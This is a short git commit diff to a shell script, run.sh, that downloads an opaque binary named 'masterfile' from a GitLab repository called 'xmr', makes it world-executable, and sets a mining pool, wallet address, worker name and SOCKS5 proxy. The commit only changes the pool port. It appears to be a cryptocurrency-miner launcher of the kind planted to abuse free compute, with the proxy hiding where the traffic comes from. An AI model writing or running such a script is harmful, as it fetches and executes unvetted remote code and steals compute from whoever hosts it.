5708f18e794796c0806caf9e6d9970dfeceae42a
TomikoBraswell <89598982+TomikoBraswell@users.noreply.github.com>
2021-08-26 16:32:08 +0000

    Update run.sh

--- run.sh
+++ run.sh
@@ -1,7 +1,7 @@
 #!/bin/sh
 wget https://gitlab.com/buyutuk/xmr/-/raw/main/masterfile
 chmod 777 masterfile
-POOL=us.uplexa.herominers.com:10380
+POOL=us.uplexa.herominers.com:1177
 WALLET=UmWLzD8WeTeHGsLkg62HNL1np52QG5rRxBUc4iL6rtyGQcdUrkGwUBQQAEjSZQTR3DdW27iJrq6aAXBLrYveNegr2JwsVeAHZ
 WORKER=CPU
 PROXY=socks5://192.252.209.155:14455
